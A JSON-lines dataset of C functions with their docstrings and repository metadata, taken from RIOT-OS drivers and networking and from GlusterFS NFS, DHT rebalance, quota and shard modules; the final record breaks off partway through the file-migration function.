{"docstring": "/* The state array must be initialized to not be all zero */\n", "func_signal": "uint32_t xorshift128(uint32_t *state)", "code": "{\n    uint32_t t = state[3];\n\n    t ^= t << 11;\n    t ^= t >> 8;\n    state[3] = state[2];\n    state[2] = state[1];\n    state[1] = state[0];\n    t ^= state[0];\n    t ^= state[0] >> 19;\n    state[0] = t;\n\n    return t;\n}", "path": "RIOT/sys/random/xorshift.c", "commit_date": "2019-05-02 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/*------------------------------------------------------------------------------------*/\n/*                                Internal functions                                  */\n/*------------------------------------------------------------------------------------*/\n", "func_signal": "static int _read_ut(const bmp180_t *dev, int32_t *output)", "code": "{\n    /* Read UT (Uncompsensated Temperature value) */\n    uint8_t ut[2] = {0};\n    uint8_t control[2] = { BMP180_REGISTER_CONTROL, BMP180_TEMPERATURE_COMMAND };\n    i2c_write_bytes(DEV_I2C, DEV_ADDR, control, 2, 0);\n    xtimer_usleep(BMP180_ULTRALOWPOWER_DELAY);\n    if (i2c_read_regs(DEV_I2C, DEV_ADDR, BMP180_REGISTER_DATA, ut, 2, 0) < 0) {\n        DEBUG(\"[Error] Cannot read uncompensated temperature.\\n\");\n        i2c_release(DEV_I2C);\n        return -1;\n    }\n    *output = ((uint16_t)ut[0] << 8) | ut[1];\n\n    DEBUG(\"UT: %i\\n\", (int)*output);\n\n    return 0;\n}", "path": "RIOT/drivers/bmp180/bmp180.c", "commit_date": "2020-10-22 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Handle a playback completed event\n *\n * @param   dev     DFPlayer device descriptor\n * @param   src     Medium the track was played from\n */\n", "func_signal": "static void _handle_playback_completed(dfplayer_t *dev, dfplayer_source_t src)", "code": "{\n    uint16_t track = (((uint16_t)dev->buf[2]) << 8) | dev->buf[3];\n    DEBUG(\"[dfplayer] Playback of track %\" PRIu16 \" on medium %u completed\\n\",\n          track, (unsigned)src);\n\n    dev->flags |= DFPLAYER_FLAG_NO_ACK_BUG;\n\n    /* Note: At least some revisions report playback completed more than once,\n     * maybe to increase probability of the message reaching the MCU. This\n     * de-duplicates the message by ignoring follow up messages for 100ms.\n     * Filtering by track number and medium wouldn't work here, as the same\n     * song might be played in repeat mode.\n     */\n    uint32_t now_us = xtimer_now_usec();\n    if (dev->cb_done && (now_us - dev->last_event_us > DFPLAYER_TIMEOUT_MS * US_PER_MS)) {\n        dev->cb_done(dev, src, track);\n    }\n    dev->last_event_us = now_us;\n}", "path": "RIOT/drivers/dfplayer/dfplayer_internal.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Function to run when frame is fully received\n *\n * @param   dev     Device descriptor of the transceiver\n *\n * Intended to be called from @ref cc110x_rx_continue\n */\n", "func_signal": "static netdev_event_t cc110x_rx_done(cc110x_t *dev)", "code": "{\n    uint8_t lqi_crc;\n    int8_t rssi;\n\n    cc110x_read(dev, CC110X_REG_LQI, &lqi_crc);\n    cc110x_read(dev, CC110X_REG_RSSI, (uint8_t *)&rssi);\n\n    /* CRC_OK bit is most significant bit, see page 92 in the data sheet */\n    if (!(lqi_crc & 0x80)) {\n        DEBUG(\"[cc110x] ISR: CRC error, dropping frame\\n\");\n        /* Drop frame and go back to RX */\n        cc110x_enter_rx_mode(dev);\n        return NETDEV_EVENT_CRC_ERROR;\n    }\n\n    /* Copy all but the CRC_OK bit */\n    dev->rx_info.lqi = (uint8_t)lqi_crc & 0x7f;\n\n    /* Use the formula in section 17.3 on page 44 in the data sheet to obtain\n     * the correct RSSI value in dBm.\n     */\n    dev->rx_info.rssi =  (int16_t)(rssi / 2) - (int16_t)dev->rssi_offset;\n\n    /* Transceiver has automatically gone to IDLE. We keep it in IDLE until\n     * upper layer fetched the frame\n     */\n    dev->state = CC110X_STATE_FRAME_READY;\n    return NETDEV_EVENT_RX_COMPLETE;\n}", "path": "RIOT/drivers/cc110x/cc110x_rx_tx.c", "commit_date": "2020-10-22 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/* CONFIG_GNRC_IPV6_NIB_REDIRECT */\n", "func_signal": "static inline bool _tl2ao_changes_nce(_nib_onl_entry_t *nce,\n                                      const ndp_opt_t *tl2ao,\n                                      gnrc_netif_t *netif,\n                                      unsigned tl2ao_addr_len)", "code": "{\n    return ((tl2ao != NULL) &&\n            (((nce->l2addr_len != tl2ao_addr_len) &&\n              (memcmp(nce->l2addr, tl2ao + 1, tl2ao_addr_len) != 0)) ||\n             (_nib_onl_get_if(nce) != (unsigned)netif->pid)));\n}", "path": "RIOT/sys/net/gnrc/network_layer/ipv6/nib/_nib-arsm.c", "commit_date": "2020-10-23 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/* SOCK_HAS_ASYNC */\n", "func_signal": "void gnrc_sock_create(gnrc_sock_reg_t *reg, gnrc_nettype_t type, uint32_t demux_ctx)", "code": "{\n    mbox_init(&reg->mbox, reg->mbox_queue, GNRC_SOCK_MBOX_SIZE);\n#ifdef SOCK_HAS_ASYNC\n    reg->async_cb.generic = NULL;\n    reg->netreg_cb.cb = _netapi_cb;\n    reg->netreg_cb.ctx = reg;\n    gnrc_netreg_entry_init_cb(&reg->entry, demux_ctx, &reg->netreg_cb);\n#else   /* SOCK_HAS_ASYNC */\n    gnrc_netreg_entry_init_mbox(&reg->entry, demux_ctx, &reg->mbox);\n#endif  /* SOCK_HAS_ASYNC */\n    gnrc_netreg_register(type, &reg->entry);\n}", "path": "RIOT/sys/net/gnrc/sock/gnrc_sock.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/*\n * nfs3_fh_auth_nfsop () -- Checks if an nfsop is authorized.\n *\n * @cs: The NFS call state containing all the relevant information\n *\n * @return: 0 if authorized\n *          -EACCES for completely unauthorized fop\n *          -EROFS  for unauthorized write operations (rm, mkdir, write)\n */\n", "func_signal": "int\nnfs3_fh_auth_nfsop(nfs3_call_state_t *cs, gf_boolean_t is_write_op)", "code": "{\n    struct nfs_state *nfs = NULL;\n    struct mount3_state *ms = NULL;\n\n    nfs = (struct nfs_state *)cs->nfsx->private;\n    ms = (struct mount3_state *)nfs->mstate;\n    return mnt3_authenticate_request(ms, cs->req, &cs->resolvefh, NULL, NULL,\n                                     NULL, NULL, is_write_op);\n}", "path": "glusterfs/xlators/nfs/server/src/nfs3-helpers.c", "commit_date": "2020-08-10 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* return values: 1 -> error, bug ignore and continue\n                  0 -> proceed\n                 -1 -> error, handle it */\n", "func_signal": "int32_t\ngf_defrag_handle_migrate_error(int32_t op_errno, gf_defrag_info_t *defrag)", "code": "{\n    int ret = 0;\n    /* if errno is not ENOTCONN, we can still continue\n       with rebalance process */\n    if (op_errno != ENOTCONN) {\n        ret = 1;\n        goto out;\n    }\n\n    if (op_errno == ENOTCONN) {\n        /* Most probably mount point went missing (mostly due\n           to a brick down), say rebalance failure to user,\n           let him restart it if everything is fine */\n        defrag->defrag_status = GF_DEFRAG_STATUS_FAILED;\n        ret = -1;\n        goto out;\n    }\n\nout:\n    return ret;\n}", "path": "glusterfs/xlators/cluster/dht/src/dht-rebalance.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/**\n * __nfs3_fh_auth_get_peer -- Get a peer name from the rpc request object\n *\n * @peer: Char * to write to\n * @req : The request to get host/peer from\n */\n", "func_signal": "int\n__nfs3_fh_auth_get_peer(const rpcsvc_request_t *req, char *peer)", "code": "{\n    struct sockaddr_storage sastorage = {\n        0,\n    };\n    rpc_transport_t *trans = NULL;\n    int ret = 0;\n\n    /* Why do we pass in the peer here and then\n     * store it rather than malloc() and return a char * ? We want to avoid\n     * heap allocations in the IO path as much as possible for speed\n     * so we try to keep all allocations on the stack.\n     */\n    trans = rpcsvc_request_transport(req);\n    ret = rpcsvc_transport_peeraddr(trans, peer, RPCSVC_PEER_STRLEN, &sastorage,\n                                    sizeof(sastorage));\n    if (ret != 0) {\n        gf_msg(GF_NFS3, GF_LOG_WARNING, 0, NFS_MSG_GET_PEER_ADDR_FAIL,\n               \"Failed to get peer addr: %s\", gai_strerror(ret));\n    }\n    return ret;\n}", "path": "glusterfs/xlators/nfs/server/src/nfs3-helpers.c", "commit_date": "2020-08-10 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* Logs if\n *  i.   Usage crossed soft limit\n *  ii.  Usage above soft limit and alert-time elapsed\n */\n", "func_signal": "void\nquota_log_usage(xlator_t *this, quota_inode_ctx_t *ctx, inode_t *inode,\n                int64_t delta)", "code": "{\n    time_t cur_time = 0;\n    char *usage_str = NULL;\n    char *path = NULL;\n    int64_t cur_size = 0;\n    quota_priv_t *priv = NULL;\n\n    priv = this->private;\n    cur_size = ctx->size + delta;\n\n    if ((ctx->soft_lim <= 0) || cur_size < ctx->soft_lim)\n        return;\n\n    /* Usage crossed/reached soft limit */\n    if (DID_REACH_LIMIT(ctx->soft_lim, ctx->size, cur_size)) {\n        quota_log_helper(&usage_str, cur_size, inode, &path, &cur_time);\n\n        gf_msg(this->name, GF_LOG_ALERT, 0, Q_MSG_CROSSED_SOFT_LIMIT,\n               \"Usage crossed soft limit: \"\n               \"%s used by %s\",\n               usage_str, path);\n\n        gf_event(EVENT_QUOTA_CROSSED_SOFT_LIMIT,\n                 \"Usage=%s;volume=%s;\"\n                 \"path=%s\",\n                 usage_str, priv->volume_uuid, path);\n\n        ctx->prev_log_time = cur_time;\n\n    }\n    /* Usage is above soft limit */\n    else if (cur_size > ctx->soft_lim &&\n             quota_timeout(ctx->prev_log_time, priv->log_timeout)) {\n        quota_log_helper(&usage_str, cur_size, inode, &path, &cur_time);\n\n        gf_msg(this->name, GF_LOG_ALERT, 0, Q_MSG_CROSSED_SOFT_LIMIT,\n               \"Usage is above soft limit: %s used by %s\", usage_str, path);\n\n        gf_event(EVENT_QUOTA_CROSSED_SOFT_LIMIT,\n                 \"Usage=%s;volume=%s;\"\n                 \"path=%s\",\n                 usage_str, priv->volume_uuid, path);\n\n        ctx->prev_log_time = cur_time;\n    }\n\n    if (path)\n        GF_FREE(path);\n\n    if (usage_str)\n        GF_FREE(usage_str);\n}", "path": "glusterfs/xlators/features/quota/src/quota.c", "commit_date": "2020-08-07 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* To be called with priv->table.lock held */\n", "func_signal": "void\n__qr_cache_prune(xlator_t *this, qr_inode_table_t *table, qr_conf_t *conf)", "code": "{\n    qr_inode_t *curr = NULL;\n    qr_inode_t *next = NULL;\n    int index = 0;\n    size_t size_pruned = 0;\n\n    for (index = 0; index < conf->max_pri; index++) {\n        list_for_each_entry_safe(curr, next, &table->lru[index], lru)\n        {\n            size_pruned += curr->size;\n\n            __qr_inode_prune(this, table, curr, 0);\n\n            if (table->cache_used < conf->cache_size)\n                return;\n        }\n    }\n\n    return;\n}", "path": "glusterfs/xlators/performance/quick-read/src/quick-read.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/*\n     return values\n     0 : File will be migrated\n    -2 : File will not be migrated\n         (This is the return value from gf_defrag_handle_hardlink. Checkout\n         gf_defrag_handle_hardlink for description of \"returning -2\")\n    -1 : failure\n*/\n", "func_signal": "static int\n__is_file_migratable(xlator_t *this, loc_t *loc, struct iatt *stbuf,\n                     dict_t *xattrs, int flags, dht_conf_t *conf,\n                     int *fop_errno)", "code": "{\n    int ret = -1;\n    int lock_count = 0;\n\n    if (IA_ISDIR(stbuf->ia_type)) {\n        gf_msg(this->name, GF_LOG_WARNING, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed:\"\n               \"%s: migrate-file called on directory\",\n               loc->path);\n        *fop_errno = EISDIR;\n        ret = -1;\n        goto out;\n    }\n\n    if (!conf->lock_migration_enabled) {\n        ret = dict_get_int32(xattrs, GLUSTERFS_POSIXLK_COUNT, &lock_count);\n        if (ret) {\n            gf_msg(this->name, GF_LOG_WARNING, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Migrate file failed:\"\n                   \"%s: Unable to get lock count for file\",\n                   loc->path);\n            *fop_errno = EINVAL;\n            ret = -1;\n            goto out;\n        }\n\n        if (lock_count) {\n            gf_msg(this->name, GF_LOG_WARNING, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Migrate file failed: %s: File has locks.\"\n                   \" Skipping file migration\",\n                   loc->path);\n            *fop_errno = ENOTSUP;\n            ret = 1;\n            goto out;\n        }\n    }\n\n    /* Check if file has hardlink*/\n    ret = __check_file_has_hardlink(this, loc, stbuf, xattrs, flags, conf,\n                                    fop_errno);\nout:\n    return ret;\n}", "path": "glusterfs/xlators/cluster/dht/src/dht-rebalance.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* This function decides whether to make file based lookup or\n * fd based lookup (fstat) depending on the 3rd and 4th arg.\n * If fd != NULL and loc == NULL then call is for fstat\n * If fd == NULL and loc != NULL then call is for file based\n * lookup. Please pass args based on the requirement.\n */\n", "func_signal": "int\nshard_refresh_base_file(call_frame_t *frame, xlator_t *this, loc_t *loc,\n                        fd_t *fd, shard_post_fop_handler_t handler)", "code": "{\n    int ret = -1;\n    inode_t *inode = NULL;\n    shard_local_t *local = NULL;\n    dict_t *xattr_req = NULL;\n    gf_boolean_t need_refresh = _gf_false;\n\n    local = frame->local;\n    local->handler = handler;\n    inode = fd ? fd->inode : loc->inode;\n\n    ret = shard_inode_ctx_fill_iatt_from_cache(inode, this, &local->prebuf,\n                                               &need_refresh);\n    /* By this time, inode ctx should have been created either in create,\n     * mknod, readdirp or lookup. If not it is a bug!\n     */\n    if ((ret == 0) && (need_refresh == _gf_false)) {\n        gf_msg_debug(this->name, 0,\n                     \"Skipping lookup on base file: %s\"\n                     \"Serving prebuf off the inode ctx cache\",\n                     uuid_utoa(inode->gfid));\n        goto out;\n    }\n\n    xattr_req = dict_new();\n    if (!xattr_req) {\n        local->op_ret = -1;\n        local->op_errno = ENOMEM;\n        goto out;\n    }\n\n    SHARD_MD_READ_FOP_INIT_REQ_DICT(this, xattr_req, inode->gfid, local, out);\n\n    if (fd)\n        STACK_WIND(frame, shard_fstat_base_file_cbk, FIRST_CHILD(this),\n                   FIRST_CHILD(this)->fops->fstat, fd, xattr_req);\n    else\n        STACK_WIND(frame, shard_lookup_base_file_cbk, FIRST_CHILD(this),\n                   FIRST_CHILD(this)->fops->lookup, loc, xattr_req);\n\n    dict_unref(xattr_req);\n    return 0;\n\nout:\n    if (xattr_req)\n        dict_unref(xattr_req);\n    handler(frame, this);\n    return 0;\n}", "path": "glusterfs/xlators/features/shard/src/shard.c", "commit_date": "2020-08-06 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* Return: 1 if new entry added\n *         0 no entry added\n *        -1 on errors\n */\n", "func_signal": "static int32_t\nquota_add_parent(struct list_head *list, char *name, uuid_t pgfid)", "code": "{\n    quota_dentry_t *entry = NULL;\n    gf_boolean_t found = _gf_false;\n    int ret = 0;\n\n    if (!list_empty(list)) {\n        list_for_each_entry(entry, list, next)\n        {\n            if (gf_uuid_compare(pgfid, entry->par) == 0) {\n                found = _gf_true;\n                goto out;\n            }\n        }\n    }\n\n    entry = __quota_dentry_new(NULL, name, pgfid);\n    if (entry)\n        list_add_tail(&entry->next, list);\n    else\n        ret = -1;\n\nout:\n    if (found)\n        return 0;\n    else if (ret == 0)\n        return 1;\n    else\n        return -1;\n}", "path": "glusterfs/xlators/features/quota/src/quota.c", "commit_date": "2020-08-07 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* TO-DO:\n * Fix updates to size and block count with racing write(s) and truncate(s).\n */\n", "func_signal": "int\nshard_truncate(call_frame_t *frame, xlator_t *this, loc_t *loc, off_t offset,\n               dict_t *xdata)", "code": "{\n    int ret = -1;\n    uint64_t block_size = 0;\n    shard_local_t *local = NULL;\n\n    ret = shard_inode_ctx_get_block_size(loc->inode, this, &block_size);\n    if (ret) {\n        gf_msg(this->name, GF_LOG_ERROR, 0, SHARD_MSG_INODE_CTX_GET_FAILED,\n               \"Failed to get block \"\n               \"size from inode ctx of %s\",\n               uuid_utoa(loc->inode->gfid));\n        goto err;\n    }\n\n    if (!block_size || frame->root->pid == GF_CLIENT_PID_GSYNCD) {\n        STACK_WIND(frame, default_truncate_cbk, FIRST_CHILD(this),\n                   FIRST_CHILD(this)->fops->truncate, loc, offset, xdata);\n        return 0;\n    }\n\n    if (!this->itable)\n        this->itable = loc->inode->table;\n\n    local = mem_get0(this->local_pool);\n    if (!local)\n        goto err;\n\n    frame->local = local;\n\n    ret = syncbarrier_init(&local->barrier);\n    if (ret)\n        goto err;\n    loc_copy(&local->loc, loc);\n    local->offset = offset;\n    local->block_size = block_size;\n    local->fop = GF_FOP_TRUNCATE;\n    local->xattr_req = (xdata) ? dict_ref(xdata) : dict_new();\n    if (!local->xattr_req)\n        goto err;\n    local->resolver_base_inode = loc->inode;\n    GF_ATOMIC_INIT(local->delta_blocks, 0);\n\n    shard_refresh_base_file(frame, this, &local->loc, NULL,\n                            shard_post_lookup_truncate_handler);\n    return 0;\n\nerr:\n    shard_common_failure_unwind(GF_FOP_TRUNCATE, frame, -1, ENOMEM);\n    return 0;\n}", "path": "glusterfs/xlators/features/shard/src/shard.c", "commit_date": "2020-08-06 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* This function iterates the parent list in inode\n * context and add unique parent to the list\n * Returns number of dentry added to the list, or -1 on errors\n */\n", "func_signal": "static int32_t\nquota_add_parents_from_ctx(quota_inode_ctx_t *ctx, struct list_head *list)", "code": "{\n    int ret = 0;\n    quota_dentry_t *dentry = NULL;\n    int32_t count = 0;\n\n    if (ctx == NULL || list == NULL)\n        goto out;\n\n    LOCK(&ctx->lock);\n    {\n        list_for_each_entry(dentry, &ctx->parents, next)\n        {\n            ret = quota_add_parent(list, dentry->name, dentry->par);\n            if (ret == 1)\n                count++;\n            else if (ret == -1)\n                break;\n        }\n    }\n    UNLOCK(&ctx->lock);\n\nout:\n    return (ret == -1) ? -1 : count;\n}", "path": "glusterfs/xlators/features/quota/src/quota.c", "commit_date": "2020-08-07 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* test for truncate()/seek()/write()/mmap()\n * There should ne no SIGBUS triggered.\n */\n", "func_signal": "void\nseek_write(char *filename)", "code": "{\n    int fd;\n    uint8_t *map;\n    int i;\n\n    fd = open(filename, O_RDWR | O_CREAT | O_TRUNC, 0600);\n    lseek(fd, FILE_SIZE - 1, SEEK_SET);\n    write(fd, \"\\xff\", 1);\n\n    map = mmap(NULL, FILE_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);\n    for (i = 0; i < (FILE_SIZE - 1); i++) {\n        if (map[i] != 0) /* should never be true */\n            abort();\n    }\n    munmap(map, FILE_SIZE);\n\n    close(fd);\n}", "path": "glusterfs/tests/bugs/write-behind/bug-1058663.c", "commit_date": "2018-09-12 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/*\n * Special case: If op_ret is -1, it's very unusual op_errno being\n * 0 which means something came wrong from upper layer(s). If it\n * happens by any means, then set NFS3 status to NFS3ERR_SERVERFAULT.\n */\n", "func_signal": "nfsstat3\nnfs3_cbk_errno_status(int32_t op_ret, int32_t op_errno)", "code": "{\n    if ((op_ret == -1) && (op_errno == 0)) {\n        return NFS3ERR_SERVERFAULT;\n    }\n\n    return nfs3_errno_to_nfsstat3(op_errno);\n}", "path": "glusterfs/xlators/nfs/server/src/nfs3-helpers.c", "commit_date": "2020-08-10 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/*\n  return values:\n\n   -1 : failure\n    0 : successfully migrated data\n    1 : not a failure, but we can't migrate data as of now\n*/\n", "func_signal": "static int\ndht_migrate_file(xlator_t *this, loc_t *loc, xlator_t *cached_subvol,\n                 xlator_t *hashed_subvol, int flag, int *fop_errno)", "code": "{\n    int ret = -1;\n    struct iatt new_stbuf = {\n        0,\n    };\n    struct iatt stbuf = {\n        0,\n    };\n    struct iatt empty_iatt = {\n        0,\n    };\n    ia_prot_t src_ia_prot = {\n        0,\n    };\n    fd_t *src_fd = NULL;\n    fd_t *dst_fd = NULL;\n    dict_t *dict = NULL;\n    dict_t *xattr = NULL;\n    dict_t *xattr_rsp = NULL;\n    int file_has_holes = 0;\n    dht_conf_t *conf = this->private;\n    int rcvd_enoent_from_src = 0;\n    struct gf_flock flock = {\n        0,\n    };\n    struct gf_flock plock = {\n        0,\n    };\n    loc_t tmp_loc = {\n        0,\n    };\n    loc_t parent_loc = {\n        0,\n    };\n    gf_boolean_t inodelk_locked = _gf_false;\n    gf_boolean_t entrylk_locked = _gf_false;\n    gf_boolean_t p_locked = _gf_false;\n    int lk_ret = -1;\n    gf_boolean_t clean_src = _gf_false;\n    gf_boolean_t clean_dst = _gf_false;\n    int log_level = GF_LOG_INFO;\n    gf_boolean_t delete_src_linkto = _gf_true;\n    lock_migration_info_t locklist;\n    dict_t *meta_dict = NULL;\n    gf_boolean_t meta_locked = _gf_false;\n    gf_boolean_t target_changed = _gf_false;\n    xlator_t *new_target = NULL;\n    xlator_t *old_target = NULL;\n    fd_t *linkto_fd = NULL;\n    dict_t *xdata = NULL;\n\n    gf_log(this->name, log_level, \"%s: attempting to move from %s to %s\",\n           loc->path, cached_subvol->name, hashed_subvol->name);\n\n    dict = dict_new();\n    if (!dict) {\n        ret = -1;\n        *fop_errno = ENOMEM;\n        gf_msg(this->name, GF_LOG_ERROR, ENOMEM, DHT_MSG_NO_MEMORY,\n               \"Could not allocate memory for dict\");\n        goto out;\n    }\n    ret = dict_set_int32(dict, conf->link_xattr_name, 256);\n    if (ret) {\n        *fop_errno = ENOMEM;\n        ret = -1;\n        gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed:\"\n               \"%s: failed to set 'linkto' key in dict\",\n               loc->path);\n        goto out;\n    }\n\n    /* Do not migrate file in case lock migration is not enabled on the\n     * volume*/\n    if (!conf->lock_migration_enabled) {\n        ret = dict_set_int32(dict, GLUSTERFS_POSIXLK_COUNT, sizeof(int32_t));\n        if (ret) {\n            *fop_errno = ENOMEM;\n            ret = -1;\n            gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Migrate file failed: %s: failed to \"\n                   \"set \" GLUSTERFS_POSIXLK_COUNT \" key in dict\",\n                   loc->path);\n            goto out;\n        }\n    } else {\n        gf_msg(this->name, GF_LOG_INFO, 0, 0,\n               \"locks will be migrated\"\n               \" for file: %s\",\n               loc->path);\n    }\n\n    /* The file is locked to prevent a rename during a migration. Renames\n     * and migrations on the file at the same time can lead to data loss.\n     */\n\n    ret = dht_build_parent_loc(this, &parent_loc, loc, fop_errno);\n    if (ret < 0) {\n        ret = -1;\n        gf_msg(this->name, GF_LOG_WARNING, *fop_errno,\n               DHT_MSG_MIGRATE_FILE_FAILED,\n               \"%s: failed to build parent loc, which is needed to \"\n               \"acquire entrylk to synchronize with renames on this \"\n               \"path. Skipping migration\",\n               loc->path);\n        goto out;\n    }\n\n    flock.l_type = F_WRLCK;\n\n    tmp_loc.inode = inode_ref(loc->inode);\n    gf_uuid_copy(tmp_loc.gfid, loc->gfid);\n    tmp_loc.path = gf_strdup(loc->path);\n\n    /* this inodelk happens with flock.owner being zero. But to synchronize\n     * hardlink migration we need to have different lkowner for each migration\n     * Filed a bug here: https://bugzilla.redhat.com/show_bug.cgi?id=1468202 to\n     * track the fix for this. Currently synclock takes care of synchronizing\n     * hardlink migration. Once this bug is fixed we can avoid taking synclock\n     */\n    ret = syncop_inodelk(cached_subvol, DHT_FILE_MIGRATE_DOMAIN, &tmp_loc,\n                         F_SETLKW, &flock, NULL, NULL);\n    if (ret < 0) {\n        *fop_errno = -ret;\n        ret = -1;\n        gf_msg(this->name, GF_LOG_WARNING, *fop_errno,\n               DHT_MSG_MIGRATE_FILE_FAILED,\n               \"migrate file failed: \"\n               \"%s: failed to lock file on %s\",\n               loc->path, cached_subvol->name);\n        goto out;\n    }\n\n    inodelk_locked = _gf_true;\n\n    /* dht_rename has changed to use entrylk on hashed subvol for\n     * synchronization. So, rebalance too has to acquire an entrylk on\n     * hashed subvol.\n     */\n    ret = syncop_entrylk(hashed_subvol, DHT_ENTRY_SYNC_DOMAIN, &parent_loc,\n                         loc->name, ENTRYLK_LOCK, ENTRYLK_WRLCK, NULL, NULL);\n    if (ret < 0) {\n        *fop_errno = -ret;\n        ret = -1;\n        gf_msg(this->name, GF_LOG_WARNING, *fop_errno,\n               DHT_MSG_MIGRATE_FILE_FAILED,\n               \"%s: failed to acquire entrylk on subvol %s\", loc->path,\n               hashed_subvol->name);\n        goto out;\n    }\n\n    entrylk_locked = _gf_true;\n\n    /* Phase 1 - Data migration is in progress from now on */\n    ret = syncop_lookup(cached_subvol, loc, &stbuf, NULL, dict, &xattr_rsp);\n    if (ret) {\n        *fop_errno = -ret;\n        ret = -1;\n        gf_msg(this->name, GF_LOG_ERROR, *fop_errno,\n               DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed:\"\n               \"%s: lookup failed on %s\",\n               loc->path, cached_subvol->name);\n        goto out;\n    }\n\n    /* preserve source mode, so set the same to the destination */\n    src_ia_prot = stbuf.ia_prot;\n\n    /* Check if file can be migrated */\n    ret = __is_file_migratable(this, loc, &stbuf, xattr_rsp, flag, conf,\n                               fop_errno);\n    if (ret) {\n        if (ret == HARDLINK_MIG_INPROGRESS)\n            ret = 0;\n        goto out;\n    }\n\n    /* Take care of the special files */\n    if (!IA_ISREG(stbuf.ia_type)) {\n        /* Special files */\n        ret = migrate_special_files(this, cached_subvol, hashed_subvol, loc,\n                                    &stbuf, fop_errno);\n        goto out;\n    }\n\n    /* Try to preserve 'holes' while migrating data */\n    if (stbuf.ia_size > (stbuf.ia_blocks * GF_DISK_SECTOR_SIZE))\n        file_has_holes = 1;\n\n    /* create the destination, with required modes/xattr */\n    ret = __dht_rebalance_create_dst_file(this, hashed_subvol, cached_subvol,\n                                          loc, &stbuf, &dst_fd, fop_errno,\n                                          file_has_holes);\n    if (ret) {\n        gf_msg(this->name, GF_LOG_ERROR, 0, 0,\n               \"Create dst failed\"\n               \" on - %s for file - %s\",\n               hashed_subvol->name, loc->path);\n        goto out;\n    }\n\n    clean_dst = _gf_true;\n\n    ret = __dht_check_free_space(this, hashed_subvol, cached_subvol, loc,\n                                 &stbuf, flag, conf, &target_changed,\n                                 &new_target, fop_errno);\n    if (target_changed) {\n        /* Can't handle for hardlinks. Marking this as failure */\n        if (flag == GF_DHT_MIGRATE_HARDLINK_IN_PROGRESS || stbuf.ia_nlink > 1) {\n            gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_SUBVOL_INSUFF_SPACE,\n                   \"Exiting migration for\"\n                   \" file - %s. flag - %d, stbuf.ia_nlink - %d\",\n                   loc->path, flag, stbuf.ia_nlink);\n            ret = -1;\n            goto out;\n        }\n\n        ret = syncop_ftruncate(hashed_subvol, dst_fd, 0, NULL, NULL, NULL,\n                               NULL);\n        if (ret) {\n            gf_log(this->name, GF_LOG_WARNING,\n                   \"%s: failed to perform truncate on %s (%s)\", loc->path,\n                   hashed_subvol->name, strerror(-ret));\n        }\n\n        syncop_close(dst_fd);\n        dst_fd = NULL;\n\n        old_target = hashed_subvol;\n        hashed_subvol = new_target;\n\n        clean_dst = _gf_false;\n\n        /* if the file migration is successful to this new target, then\n         * update the xattr on the old destination to point the new\n         * destination. We need to do update this only post migration\n         * as in case of failure the linkto needs to point to the source\n         * subvol */\n        ret = __dht_rebalance_create_dst_file(\n            this, hashed_subvol, cached_subvol, loc, &stbuf, &dst_fd, fop_errno,\n            file_has_holes);\n        if (ret) {\n            gf_log(this->name, GF_LOG_ERROR,\n                   \"Create dst failed\"\n                   \" on - %s for file - %s\",\n                   hashed_subvol->name, loc->path);\n            goto out;\n        } else {\n            gf_msg(this->name, GF_LOG_INFO, 0, 0,\n                   \"destination for file \"\n                   \"- %s is changed to - %s\",\n                   loc->path, hashed_subvol->name);\n            clean_dst = _gf_true;\n        }\n    }\n\n    if (ret) {\n        goto out;\n    }\n\n    /* Open the source, and also update mode/xattr */\n    ret = __dht_rebalance_open_src_file(this, cached_subvol, hashed_subvol, loc,\n                                        &stbuf, &src_fd, &clean_src, fop_errno);\n    if (ret) 